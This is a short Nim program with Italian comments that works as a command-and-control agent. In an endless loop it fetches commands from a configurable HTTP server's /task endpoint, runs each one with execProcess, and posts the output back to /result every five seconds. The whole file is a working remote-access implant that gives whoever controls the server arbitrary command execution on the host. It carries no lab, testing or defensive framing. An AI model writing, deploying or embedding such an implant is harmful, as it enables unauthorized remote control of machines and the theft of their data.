import httpclient, os, osproc, strutils, parseopt

var serverIP = "127.0.0.1"  # default locale

# Parsing degli argomenti
for kind, key, val in getOpt():
  if kind == cmdArgument:
    serverIP = key
  elif kind == cmdLongOption and key == "server":
    serverIP = val

const serverPort = 5000
let serverURL = "http://" & serverIP & ":" & $serverPort

proc getTask(): string =
  let client = newHttpClient()
  try:
    let response = client.get(serverURL & "/task")
    result = response.body.strip()
  except:
    result = ""
  client.close()

proc sendResult(output: string) =
  let client = newHttpClient()
  try:
    discard client.post(serverURL & "/result", body = output)
  except:
    discard
  client.close()

while true:
  let cmd = getTask()
  if cmd.len > 0:
    let output = execProcess(cmd)
    sendResult(output)
    echo "Comando eseguito: ", cmd
  sleep(5000)
